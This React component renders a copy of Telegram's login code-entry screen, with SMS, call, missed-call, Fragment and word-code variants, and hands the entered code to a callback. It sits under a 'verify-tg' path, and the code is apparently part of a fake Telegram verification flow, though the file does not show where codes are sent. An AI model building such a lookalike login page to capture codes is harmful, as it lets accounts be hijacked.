import { useEffect, useRef, useState } from "react";
import type { CodeDelivery } from "@/verify-tg/lib/types";
import { clock, errorText, t, type Locale } from "@/verify-tg/lib/i18n";
import { BubbleIcon, FlashCallIcon, LaptopIcon, MissedCallIcon, SmsIcon } from "./icons";
import { PhoneKeyboard } from "./PhoneKeyboard";
import { CodeCells, Fab, Outline, RichText } from "./ui";

export function CodeStep({
  locale,
  phone,
  delivery,
  errorToken,
  errorCode,
  loading,
  onSubmit,
  onResend,
  onWrongNumber,
  onHelp,
}: {
  locale: Locale;
  phone: string;
  delivery: CodeDelivery;
  errorToken: number;
  errorCode?: string;
  loading: boolean;
  onSubmit: (code: string) => void;
  onResend: () => void;
  onWrongNumber: () => void;
  onHelp: () => void;
}) {
  const length = delivery.length && delivery.length > 0 ? delivery.length : delivery.type === "smsWord" || delivery.type === "smsPhrase" ? 0 : 5;
  const [code, setCode] = useState("");
  const [phrase, setPhrase] = useState(delivery.beginning ?? "");
  const [bad, setBad] = useState(false);
  const [left, setLeft] = useState(delivery.timeout ?? 0);
  const [resending, setResending] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const sent = useRef("");

  useEffect(() => {
    setLeft(delivery.timeout ?? 0);
    setPhrase(delivery.beginning ?? "");
    setCode("");
    sent.current = "";
  }, [delivery]);

  useEffect(() => {
    if (left <= 0) return;
    const timer = window.setInterval(() => setLeft((current) => Math.max(0, current - 1)), 1000);
    return () => window.clearInterval(timer);
  }, [left]);

  useEffect(() => {
    if (!errorToken) return;
    setBad(true);
    const timer = window.setTimeout(() => {
      setCode("");
      sent.current = "";
      setBad(false);
      inputRef.current?.focus();
    }, 450);
    return () => window.clearTimeout(timer);
  }, [errorToken]);

  useEffect(() => {
    inputRef.current?.focus();
  }, [delivery.type]);

  const titles = {
    app: "appTitle",
    sms: "smsTitle",
    call: "callTitle",
    flashCall: "yourCode",
    missedCall: "missedTitle",
    fragment: "fragmentTitle",
    smsWord: "wordTitle",
    smsPhrase: "phraseTitle",
  } as const;
  const titleKey = titles[delivery.type];

  const body =
    delivery.type === "app"
      ? t(locale, "sentApp")
      : delivery.type === "call" || delivery.type === "flashCall"
        ? t(locale, "sentCall", { phone })
        : delivery.type === "fragment"
          ? t(locale, "sentFragment", { phone })
          : delivery.type === "missedCall"
            ? t(locale, "missedSubtitle")
            : delivery.type === "smsWord" || delivery.type === "smsPhrase"
              ? ""
              : t(locale, "sentSms", { phone });

  function updateCode(value: string) {
    if (loading || bad) return;
    const next = value.replace(/\D/g, "").slice(0, length);
    setCode(next);
    if (length && next.length === length && sent.current !== next) {
      sent.current = next;
      onSubmit(next);
    }
  }

  const time = clock(left);
  const waiting = left > 0;
  const bottom = resending
    ? delivery.nextType === "call" || delivery.nextType === "missedCall"
      ? t(locale, "calling")
      : t(locale, "sendingSms")
    : waiting
      ? t(
          locale,
          delivery.nextType === "call" || delivery.nextType === "missedCall"
            ? "callIn"
            : delivery.type === "sms"
              ? "resendSmsIn"
              : "smsIn",
          time,
        )
      : delivery.nextType === "call"
        ? t(locale, "getCall")
        : delivery.nextType === "missedCall"
          ? t(locale, "getMissed")
          : delivery.nextType
            ? t(locale, "getSms")
            : t(locale, "didNotGet");

  const word = delivery.type === "smsWord" || delivery.type === "smsPhrase";
  const keyboard = !word && delivery.type !== "flashCall";

  return (
    <>
      <div className="flex flex-1 flex-col px-[18px] pt-[30px]">
        {delivery.type === "app" ? (
          <div className="mt-4 flex h-[112px] justify-center">
            <div className="-translate-y-6">
              <LaptopIcon />
            </div>
          </div>
        ) : delivery.type === "flashCall" ? (
          <div className="mt-4 flex justify-center">
            <FlashCallIcon />
          </div>
        ) : delivery.type === "missedCall" ? (
          <div className="mt-4 flex justify-center">
            <MissedCallIcon />
          </div>
        ) : word ? (
          <div className="mb-[5px] mt-2.5 flex justify-center">
            <BubbleIcon />
          </div>
        ) : (
          <div className="mt-4 flex justify-center">
            <SmsIcon />
          </div>
        )}
        <h1 className="mt-[18px] text-center text-[18px] font-bold" style={{ lineHeight: "calc(1em + 2px)" }}>{t(locale, titleKey)}</h1>
        {body ? (
          <p className="mt-[17px] text-center text-[14px] text-[var(--tg-gray)]" style={{ lineHeight: "calc(1em + 2px)" }}>
            <RichText text={body} strongClassName="font-bold text-[var(--tg-fab)]" />
          </p>
        ) : null}
        {delivery.type === "missedCall" && delivery.prefix ? (
          <p dir="ltr" className="mt-4 text-center text-[20px] font-bold">{delivery.prefix}</p>
        ) : null}
        {word ? (
          <div className="mx-4 mt-[3px]">
            <Outline label={t(locale, delivery.type === "smsWord" ? "wordLabel" : "phraseLabel")} active floated>
              <input
                ref={inputRef}
                value={phrase}
                onChange={(event) => {
                  const begin = delivery.beginning ?? "";
                  const next = event.target.value;
                  if (begin && !next.startsWith(begin)) return;
                  setPhrase(next);
                }}
                placeholder={t(locale, delivery.type === "smsWord" ? "wordHint" : "phraseHint")}
                className="w-full bg-transparent px-4 text-[18px] outline-none"
                style={{ paddingTop: 13.34, paddingBottom: 13.34 }}
              />
            </Outline>
          </div>
        ) : delivery.type === "flashCall" ? (
          <p dir="ltr" className="mt-8 text-center text-[18px] font-medium">{delivery.pattern}</p>
        ) : (
          <div className="mt-8">
            <CodeCells
              value={code}
              length={length}
              bad={bad}
              compact={delivery.type === "missedCall"}
              label={t(locale, "smsTitle")}
              inputRef={inputRef}
              onChange={updateCode}
            />
          </div>
        )}
        {delivery.type === "missedCall" ? (
          <p className="mt-7 px-[18px] text-center text-[14px] text-[var(--tg-gray)]" style={{ lineHeight: "calc(1em + 2px)" }}>{t(locale, "missedSubtitle2")}</p>
        ) : null}
        <button type="button" onClick={onWrongNumber} className="mt-[18px] w-full px-[14px] pt-2 pb-4 text-center text-[14px] text-[var(--tg-value)]" style={{ lineHeight: "calc(1em + 2px)" }}>
          {t(locale, "wrongNumber")}
        </button>
        {errorCode ? <p className="mt-3 text-center text-[15px] text-[var(--tg-danger)]">{errorText(locale, errorCode)}</p> : null}
        <div className="flex-1" />
        {delivery.type === "fragment" && delivery.url ? (
          <a
            href={delivery.url}
            target="_blank"
            rel="noreferrer"
            className="mx-auto flex h-[52px] items-center justify-center rounded-[8px] bg-[var(--tg-fab)] px-8 text-[15px] font-bold text-white"
          >
            {t(locale, "openFragment")}
          </a>
        ) : (
          <button
            type="button"
            disabled={waiting || resending || loading}
            onClick={() => {
              if (delivery.nextType) {
                setResending(true);
                onResend();
                window.setTimeout(() => setResending(false), 600);
                return;
              }
              onHelp();
            }}
            className={`w-full px-[14px] pt-2 pb-4 text-center text-[15px] ${keyboard ? "mb-4" : "mb-8"} ${waiting ? "text-[var(--tg-gray)]" : delivery.nextType ? "text-[var(--tg-fab)]" : "text-[var(--tg-link)]"}`}
            style={{ lineHeight: "calc(1em + 2px)" }}
          >
            {bottom}
          </button>
        )}
      </div>
      {word ? (
        <Fab
          loading={loading}
          onClick={() => {
            if (phrase.trim().length > (delivery.beginning ?? "").length) onSubmit(phrase.trim());
          }}
        />
      ) : keyboard ? (
        <PhoneKeyboard />
      ) : null}
    </>
  );
}
